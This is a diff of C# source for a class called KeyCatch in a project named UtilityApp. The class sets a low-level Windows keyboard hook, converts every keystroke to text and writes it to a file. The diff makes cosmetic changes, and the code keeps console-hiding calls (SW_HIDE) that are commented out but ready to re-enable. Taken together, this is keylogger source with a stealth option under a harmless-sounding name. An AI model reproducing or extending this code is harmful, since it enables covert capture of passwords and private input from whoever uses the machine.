@@ -1,16 +1,12 @@
 ﻿using System;
-using System.Collections.Generic;
-using System.Linq;
-using System.Text;
-using System.Threading.Tasks;
 using System.Diagnostics;
-using System.Windows.Forms;
-using System.Runtime.InteropServices;
 using System.IO;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
 
 namespace UtilityApp
 {
-    class KeyCatch
+    internal class KeyCatch
     {
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
@@ -24,9 +20,8 @@ namespace UtilityApp
             //Cleanse the variable in case loggin is run twice
             endLogging = false;
 
+            //Hide/Show code
             //var handle = GetConsoleWindow();
-
-            //Hide
             //ShowWindow(handle, SW_HIDE);
 
             _hookID = SetHook(_proc);
@@ -84,12 +79,14 @@ namespace UtilityApp
                         case Keys.Space:
                             output = " ";
                             break;
+
                         case Keys.RShiftKey:
                         case Keys.Shift:
                         case Keys.LShiftKey:
                         case Keys.ShiftKey:
                             output = "[SHIFT]";
                             break;
+
                         default:
                             output = "[" + kc.ConvertToString((Keys)vkCode) + "]";
                             break;
@@ -99,8 +96,6 @@ namespace UtilityApp
                 {
                     //Is a numpad number. Strip the "NumPad" from the string
                     output = kc.ConvertToString((Keys)vkCode).Substring(6);
-                    //Environment.Exit(0);
-                    //GenerateConsoleCtrlEvent(XConsoleEvent.CTRL_C, 0);
                 }
                 else
                 {
@@ -108,17 +103,12 @@ namespace UtilityApp
                     output = kc.ConvertToString((Keys)vkCode).ToLower();
                 }
                 Console.WriteLine(output);
-                
+
                 sw.Write(output);
             }
             if (endLogging)
             {
                 ConsoleCtrlCheck(CtrlTypes.CTRL_BREAK_EVENT);
-                
-                //Environment.Exit(0);
-                //var handle = GetConsoleWindow();
-                //ShowWindow(handle, 1);
-                //Application.Exit();
                 Application.ExitThread();
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
@@ -140,12 +130,12 @@ namespace UtilityApp
         private static extern IntPtr GetModuleHandle(string lpModuleName);
 
         [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
+        private static extern IntPtr GetConsoleWindow();
 
         [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+        private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
 
-        const int SW_HIDE = 0;
+        private const int SW_HIDE = 0;
 
         [DllImport("Kernel32")]
         public static extern bool SetConsoleCtrlHandler(HandlerRoutine Handler, bool Add);
